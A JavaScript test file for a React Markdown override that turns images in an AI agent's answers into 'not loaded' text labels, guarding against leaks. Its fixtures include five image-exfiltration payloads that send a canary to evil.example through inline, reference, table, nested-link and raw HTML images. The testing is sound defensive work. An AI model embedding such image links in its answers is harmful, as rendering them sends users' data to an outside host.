import assert from "node:assert/strict"
import test from "node:test"
import { createElement } from "react"
import { renderToStaticMarkup } from "react-dom/server"
import ReactMarkdown from "react-markdown"
import remarkGfm from "remark-gfm"
import { imageAsText } from "./markdown-images.ts"

const CANARY = "doops-synthetic-canary-r41-7f2e"

function render(content, components) {
  return renderToStaticMarkup(createElement(ReactMarkdown, { remarkPlugins: [remarkGfm], components }, content))
}

const answers = [
  ["inline image", `结果如下 ![t](https://evil.example/p?d=${CANARY})`],
  ["reference image", `![x][r]\n\n[r]: https://evil.example/r?d=${CANARY}`],
  ["image in a table", `| a |\n| --- |\n| ![t](https://evil.example/t?d=${CANARY}) |`],
  ["image inside a link", `[![a](https://evil.example/i?d=${CANARY})](https://example.test)`],
  ["raw html image", `<img src="https://evil.example/h?d=${CANARY}">`],
]

test("Given an Agent answer with images, When it renders with imageAsText, Then nothing is fetched", () => {
  for (const [name, content] of answers) {
    const html = render(content, { img: imageAsText })
    assert.doesNotMatch(html, /<img\b/i, name)
    assert.doesNotMatch(html, /rel="preload"/i, name)
  }
  const html = render(`![结果图](https://evil.example/p?d=${CANARY})`, { img: imageAsText })
  assert.match(html, /图片：结果图，未加载 https:\/\/evil\.example\/p/)
})

// Without the override the same answer renders a real <img>, so the test above would catch a regression.
test("Given the default renderer, When an answer has an image, Then it is an <img>", () => {
  assert.match(render(answers[0][1], {}), /<img\b/)
})

test("Given an image without a source or alt text, When it renders as text, Then the label still says it was not loaded", () => {
  assert.match(renderToStaticMarkup(imageAsText({})), /\[图片，未加载\]/)
  assert.match(renderToStaticMarkup(imageAsText({ src: "  ", alt: "x" })), /\[图片：x，未加载\]/)
})
